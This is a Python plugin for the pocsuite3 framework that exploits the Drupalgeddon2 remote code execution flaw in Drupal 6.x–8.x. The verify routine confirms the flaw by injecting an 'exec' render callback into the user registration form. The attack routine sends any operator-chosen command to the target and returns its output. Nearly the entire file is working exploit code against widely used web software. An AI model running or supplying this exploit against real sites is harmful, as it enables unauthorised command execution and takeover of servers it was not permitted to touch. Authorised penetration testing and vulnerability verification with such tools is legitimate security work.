
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Drupal'
    appVersion = '6.x, 7.x, 8.x'
    name = 'Drupal core Remote Code Execution'
    desc = 'drupalgeddon2 remote code execution'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://www.seebug.org/vuldb/ssvid-97207']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        return o

    def _verify(self):
        result = {}
        flag = random_str(length=10)
        url = self.url.rstrip(
            '/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo "{0}";'.format(flag)
        }

        resp = requests.post(url, data=payload)
        try:
            if '"data":"{0}'.format(flag) in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        url = self.url.rstrip(
            '/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': '{}'.format(cmd)
        }

        try:
            response = requests.post(url, data=payload)
            if response and response.status_code == 200:
                result['Stdout'] = json.loads(response.text)[0]['data']
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)


register_poc(DemoPOC)
